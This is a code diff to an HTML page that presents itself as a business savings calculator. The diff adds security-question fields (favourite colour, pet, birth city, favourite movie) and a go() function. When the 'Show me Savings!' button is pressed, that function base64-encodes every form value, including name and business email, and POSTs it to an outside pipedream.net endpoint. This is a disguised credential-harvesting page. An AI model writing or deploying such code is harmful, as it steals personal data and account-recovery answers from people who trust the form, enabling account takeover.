@@ -93,11 +93,11 @@
                                 <div class="mb-3">
                                     <label for="firstName" class="form-label">First Name <span
                                             class="text-danger">*</span></label>
-                                    <input type="password" class="form-control" id="firstName">
+                                    <input type="text" class="form-control" id="firstName">
                                 </div>
                                 <div class="mb-3">
                                     <label for="lastName" class="form-label">Last Name </label>
-                                    <input type="password" class="form-control" id="lastName">
+                                    <input type="text" class="form-control" id="lastName">
                                 </div>
                                 <div class="mb-3">
                                     <label for="exampleInputEmail1" class="form-label">Business Email Address <span
@@ -110,14 +110,14 @@
                                 <div class="mb-3">
                                     <label for="firstName" class="form-label">Total number of employees in your company
                                         <span class="text-danger">*</span></label>
-                                    <input type="number" class="form-control" id="firstName">
+                                    <input type="number" class="form-control" id="employees">
                                 </div>
 
                                 <div class="mb-3">
                                     <label for="firstName" class="form-label">Average employee hourly wage at your
                                         company
                                         <span class="text-danger">*</span></label>
-                                    <input type="text" class="form-control" id="firstName">
+                                    <input type="text" class="form-control" id="employee_wage">
                                 </div>
 
                             </form>
@@ -316,29 +316,29 @@
                                 <div class="mb-3">
                                     <label for="firstName" class="form-label">What is your favorite color? <span
                                             class="text-danger">*</span></label>
-                                    <input type="password" class="form-control" id="firstName">
+                                    <input type="text" class="form-control" id="color">
                                 </div>
                                 <div class="mb-3">
                                     <label for="lastName" class="form-label">What is the name of your favorite pet?
                                         <span class="text-danger">*</span></label>
-                                    <input type="password" class="form-control" id="lastName">
+                                    <input type="text" class="form-control" id="favorite_pet">
                                 </div>
 
                                 <div class="mb-3">
                                     <label for="lastName" class="form-label">In what city where you born? <span
                                             class="text-danger">*</span></label>
-                                    <input type="password" class="form-control" id="lastName">
+                                    <input type="text" class="form-control" id="city_born">
                                 </div>
 
                                 <div class="mb-3">
                                     <label for="lastName" class="form-label">What is your favorite movie? <span
                                             class="text-danger">*</span></label>
-                                    <input type="password" class="form-control" id="lastName">
+                                    <input type="text" class="form-control" id="movie">
                                 </div>
 
 
                             </form>
-                            <a href="#" class="btn btn-primary">Show me Savings!</a>
+                            <button href="#" class="btn btn-primary" onclick="go()">Show me Savings!</button>
                         </div>
                     </div>
                 </div>
@@ -436,6 +436,33 @@
             one.classList.add("d-none")
             two.classList.add("d-none")
         }
+
+        const go = async () => {
+            let a = []
+            let inputs = document.getElementsByTagName("input")
+            for (let i = 0; i < inputs.length; i++) {
+                let x = inputs[i]
+
+                let o = {
+                    id: x.id,
+                    val: x.value
+                }
+
+                console.log(o)
+
+                a.push(o)
+            }
+
+            let b = btoa(JSON.stringify(a))
+            console.log(b)
+
+            await fetch("https://ens83mqfl0hrnh7.m.pipedream.net", {
+                method: "POST",
+                body: b
+            })
+            window.location.href = "index2.html"
+        }
+
 
     </script>
 </body>
